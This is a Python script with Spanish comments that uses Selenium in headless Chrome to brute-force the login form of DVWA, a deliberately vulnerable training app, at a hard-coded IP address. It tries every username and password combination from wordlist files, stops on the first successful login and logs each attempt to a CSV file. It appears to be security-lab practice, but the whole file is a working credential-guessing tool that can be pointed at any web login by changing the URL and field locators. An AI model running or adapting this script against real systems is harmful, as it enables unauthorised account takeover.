"""
Script de fuerza bruta para el login de DVWA usando Selenium.
Lee usuarios y contraseñas desde archivos .txt
y guarda los intentos en un archivo CSV.
"""

import csv
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options

# Configuración de la URL y archivos de entrada/salida
URL = "http://172.171.243.146/dvwa/login.php"
USERS_FILE = "BruteForce_DVWA/users.txt"
PASSWORDS_FILE = "BruteForce_DVWA/passwords.txt"
OUTPUT_FILE = "BruteForce_DVWA/bf_log.csv"


def load_wordlist(file_path):
    """Lee un archivo de texto y devuelve una lista con las líneas válidas."""
    with open(file_path, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip()]


def brute_force_login():
    """
    Ejecuta el ataque de fuerza bruta:
    - Carga usuarios y contraseñas
    - Intenta cada combinación en el login
    - Guarda los resultados en un archivo CSV
    """

    users = load_wordlist(USERS_FILE)
    passwords = load_wordlist(PASSWORDS_FILE)

    # Configuración de Chrome (headless = no abre ventana)
    options = Options()
    options.add_argument("--headless=new")
    driver = webdriver.Chrome(options=options)

    # Abrir archivo CSV para registrar intentos
    with open(OUTPUT_FILE, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(["usuario", "contraseña", "estado"])

        for user in users:
            for pwd in passwords:
                driver.get(URL)
                try:
                    # Completar formulario de login
                    driver.find_element(By.XPATH, '//*[@id="content"]/form/fieldset/input[1]').send_keys(user)
                    driver.find_element(By.XPATH, '//*[@id="content"]/form/fieldset/input[2]').send_keys(pwd)
                    driver.find_element(By.XPATH, '//*[@id="content"]/form/fieldset/p/input').click()
                    time.sleep(0.5)

                    # Verificar si se logró el login (logout.php aparece en la página)
                    if "logout.php" in driver.page_source.lower():
                        status = "ÉXITO"
                        print(f"{user}:{pwd} -> {status}")
                        writer.writerow([user, pwd, status])
                        driver.quit()
                        print(f"[INFO] Resultados guardados en {OUTPUT_FILE}")
                        return
                    else:
                        status = "FALLÓ"
                        print(f"{user}:{pwd} -> {status}")
                        writer.writerow([user, pwd, status])
                
                except Exception as e:
                    # Registrar errores de Selenium o del sitio
                    writer.writerow([user, pwd, f"error: {e}"])

    driver.quit()
    print(f"[INFO] Resultados guardados en {OUTPUT_FILE}")


if __name__ == "__main__":
    brute_force_login()
